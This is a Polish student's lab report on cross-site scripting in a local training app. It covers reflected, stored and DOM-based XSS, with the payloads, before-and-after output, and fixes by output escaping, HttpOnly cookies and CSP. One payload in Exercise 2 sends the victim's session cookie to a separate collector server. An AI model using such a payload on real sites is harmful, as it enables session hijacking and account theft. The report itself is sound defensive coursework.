Zgodnie z ustaleniem na koniec zajęć - oddanie przedłużone do końca dnia bez utraty punktów

Natalia Biernacka 331665

Repo: https://github.com/nataliabpw/ochrona_danych


# Zadanie 1.

## Adres z ładunkiem
http://127.0.0.1:8080/szukaj?q=%3Cimg%20src%3Dx%20onerror%3D%22document.body.style.background%3D%27red%27%3Bdocument.title%3D%27XSS-odbity%27%22%3E

## Numer wiersza z błędem
37 - fraza -> escape(fraza)

## Przed naprawą
`<!doctype html><meta charset='utf-8'><title>Szukaj</title><h1>Wyniki wyszukiwania dla: <img src=x onerror="document.body.style.background='red';document.title='XSS-odbity'"></h1><ul></ul><p><a href='/'>Powrót</a></p>`

## Po naprawie
`<!doctype html><meta charset='utf-8'><title>Szukaj</title><h1>Wyniki wyszukiwania dla: &lt;img src=x onerror=&quot;document.body.style.background=&#x27;red&#x27;;document.title=&#x27;XSS-odbity&#x27;&quot;&gt;</h1><ul></ul><p><a href='/'>Powrót</a></p>`

## Poprawne wyszukiwanie konsultacji po zmianie
`<!doctype html><meta charset='utf-8'><title>Szukaj</title><h1>Wyniki wyszukiwania dla: konsultacje</h1><ul><li>anna: Witajcie na tablicy ogłoszeń! Konsultacje w piątek o 12:00.</li></ul><p><a href='/'>Powrót</a></p>`

## Wniosek
Kodowanie jest lepsze od usuwania słowa script bo
zabezpiecza znaki specjalne html przed zinterpretowaniem jako kod, jednocześnie nie zmienia funkcjonalności aplikacji


# Zadanie 2

## Treść ładunku
`<img src=x onerror="new Image().src='http://localhost:8081/?c='+encodeURIComponent(document.cookie)">`

## Wpis zbieracza przed zmianą - ciasteczko Anny
zbieracz-1  | ZEBRANO: /?c=session=eyJ1enl0a293bmlrIjoiYW5uYSJ9...`

## Wpis zbieracza po zmianie - brak przechwyconego ciasteczka
zbieracz-1  | ZEBRANO: /?c=

## Wynik kroku 3
Pokazała się notatka użytkownika anna:
```
HTTP/1.1 200 OK
Server: Werkzeug/3.1.9 Python/3.12.16
Date: Fri, 13 Nov 2026 17:48:19 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 481
Vary: Cookie
Connection: close

<!doctype html>
<html lang="pl">
<head><meta charset="utf-8"><title>Notatka</title>
<link rel="stylesheet" href="/static/styl.css"></head>
<body>
<nav><a href="/">Tablica</a> | <a href="/szukaj?q=">Szukaj</a> | <a href="/podglad">Podgląd</a> |
<a href="/notatka">Moja notatka</a> | <a href="/logowanie">Logowanie</a> | <a href="/wyloguj">Wyloguj</a></nav>

<h1>Notatka użytkownika anna</h1>
<p>Prywatna notatka Anny: kod do szafki w pracowni 4721 (fikcyjny).</p>

</body>
</html>
```
## Set-Cookie przed zmianą
Set-Cookie: session=eyJ1enl0a293bmlrIjoiYW5uYSJ9... Path=/

## Set-Cookie po zmianie
session=eyJ1enl0a293bmlrIjoiYW5uYSJ9.avcBsQ...; HttpOnly; Path=/

## Wniosek
Atrybut HttpOnly chroni ciasteczko sesyjne przed bezpośrednim odczytem przez skrypty JavaScript, jednak nie zapobiega wykonywaniu złośliwego kodu wstrzykniętego na podatną stronę


# Zadanie 3

## Ładunek
http://127.0.0.1:8080/podglad#%3Cimg%20src%3Dx%20onerror%3D%22document.title%3D%27XSS-DOM%27%22%3E

## Przed zmianą 
Tytuł karty zmienił się na XXS-DOM - ładunek wykonał się

## Po zmianie
Tytuł karty nie zmiania się. Na stronie widoczny jest po prostu tekst:
`<img src=x onerror="document.title='XSS-DOM'">`

| rodzaj ładunku | wynik przed naprawą                                                  | wynik po naprawie                                                          |
|----------------|----------------------------------------------------------------------|----------------------------------------------------------------------------|
| Odbity XSS     | Ładunek wykonał się - czerwone tło i tytuł XSS-odbity                | Ładunek pokazuje się jako tekst, nie zmienia tła ani tytułu                |
| Zapisany XSS   | Ładunek wykonał się - ciasteczko przechwytywane jest przez zbieracza | Ładunek nie wykonał się. Treść ogłoszenia wyświetla się jako zwykły tekst. |
| DOM            | Ładunek wykonał się - tytuł karty zmienia się na XSS-DOM             | Ładunek nie wykonał się. Jest to zwykły tekst w podglądzie                 |

## Nagłówek CSP
HTTP/1.1 200 OK
Server: Werkzeug/3.1.9 Python/3.12.16
Date: Fri, 13 Nov 2026 18:43:58 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 583
**Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';**

## Wynik testu tekstu
Na stronie wyświetla się:
student: Zażółć gęślą jaźń: <b>pogrubienie</b> & "cudzysłów" 'apostrof'

Kod źródłowy z curl:
`<li><b>student</b>: Zażółć gęślą jaźń: &lt;b&gt;pogrubienie&lt;/b&gt; &amp; &#34;cudzysłów&#34; &#39;apostrof&#39;</li>`

## Wniosek
CSP jest dodatkową warstwą ochrony, która ogranicza możliwość wykonania niedozwolonych skryptów, ale nie zastępuje kodowania wyjścia, ponieważ nie gwarantuje bezpiecznego wyświetlania wszystkich niezaufanych danych